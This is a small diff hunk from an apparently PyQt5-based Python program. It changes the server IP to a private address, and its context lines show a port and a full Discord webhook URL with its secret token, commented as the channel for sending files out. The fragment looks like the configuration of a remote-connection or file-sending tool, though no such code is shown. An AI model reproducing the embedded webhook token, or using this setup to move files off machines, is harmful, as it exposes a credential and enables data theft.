@@ -10,7 +10,7 @@ from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout
 from PyQt5.QtCore import Qt, QThread
 
 # Global settings
-SERVER_IP = "0.0.0.0"  # Connect to this IP (server address)
+SERVER_IP = "10.0.1.33"  # Connect to this IP (server address)
 SERVER_PORT = 9999     # Connection port
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'  # For sending files via Discord
 
